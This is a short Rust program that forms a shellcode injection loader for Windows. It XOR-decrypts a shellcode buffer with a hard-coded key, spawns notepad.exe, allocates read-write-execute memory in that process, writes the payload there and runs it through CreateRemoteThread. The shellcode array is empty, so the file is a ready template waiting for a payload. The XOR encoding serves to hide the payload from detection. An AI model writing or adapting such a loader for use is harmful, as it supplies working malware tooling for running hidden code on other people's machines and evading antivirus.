extern crate winapi;
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::winnt::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS,
};
use std::ptr::null_mut;
use std::process;
use std::mem;


// Ensure the encrypt_decrypt function is correctly defined in this file
fn encrypt_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

fn main() {
    let encrypted_shellcode = vec![];
    let key = vec![0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6, 0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C];
    let shellcode = encrypt_decrypt(&encrypted_shellcode, &key);

    let notepad = process::Command::new("notepad.exe")
        .spawn()
        .expect("Failed to start notepad.exe");

    let process_handle = unsafe {
        OpenProcess(PROCESS_ALL_ACCESS, 0, notepad.id() as u32)
    };

    let alloc_mem_address = unsafe {
        VirtualAllocEx(process_handle, null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    };

    let mut bytes_written = 0;
    let success = unsafe {
        WriteProcessMemory(process_handle, alloc_mem_address, shellcode.as_ptr() as *const _, shellcode.len(), &mut bytes_written)
    };

    let thread_handle = unsafe {
        CreateRemoteThread(
            process_handle,
            null_mut(),
            0,
            Some(mem::transmute::<_, unsafe extern "system" fn(*mut winapi::ctypes::c_void) -> u32>(alloc_mem_address)),
            null_mut(),
            0,
            null_mut(),
        )
    };
}